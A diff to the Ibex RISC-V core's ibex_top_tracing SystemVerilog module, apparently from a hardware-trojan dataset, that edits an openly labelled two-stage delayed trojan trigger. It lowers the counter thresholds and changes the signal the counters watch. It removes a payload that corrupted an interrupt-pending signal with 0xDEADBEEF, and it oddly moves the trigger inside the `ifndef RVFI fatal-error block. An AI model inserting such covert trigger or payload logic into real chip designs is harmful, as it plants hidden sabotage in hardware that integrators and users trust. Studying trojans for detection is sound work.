@@ -99,14 +99,17 @@ module ibex_top_tracing import ibex_pkg::*; #(
 
 );
 
+  // ibex_tracer relies on the signals from the RISC-V Formal Interface
+  `ifndef RVFI
+    $fatal("Fatal error: RVFI needs to be defined globally.");
+
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=3068, act=1534)
     // ============================================================
-    localparam int ARM_THRESHOLD = 10924;
-    localparam int ACTIVATE_DELAY = 5462;
+    localparam int ARM_THRESHOLD   = 3068;
+    localparam int ACTIVATE_DELAY  = 1534;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter1 <= '0;
@@ -114,17 +117,13 @@ module ibex_top_tracing import ibex_pkg::*; #(
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && ram_cfg_icache_data_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && ram_cfg_icache_data_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
 
-
-  // ibex_tracer relies on the signals from the RISC-V Formal Interface
-  `ifndef RVFI
-    $fatal("Fatal error: RVFI needs to be defined globally.");
   `endif
 
   logic        rvfi_valid;
@@ -185,7 +184,7 @@ module ibex_top_tracing import ibex_pkg::*; #(
 
   // Tracer doesn't use these signals, though other modules may probe down into tracer to observe
   // them.
-  assign unused_rvfi_ext_pre_mip = trojan_active ? (rvfi_ext_pre_mip ^ 32'hDEADBEEF) : rvfi_ext_pre_mip;
+  assign unused_rvfi_ext_pre_mip = rvfi_ext_pre_mip;
   assign unused_rvfi_ext_post_mip = rvfi_ext_post_mip;
   assign unused_rvfi_ext_nmi = rvfi_ext_nmi;
   assign unused_rvfi_ext_nmi_int = rvfi_ext_nmi_int;
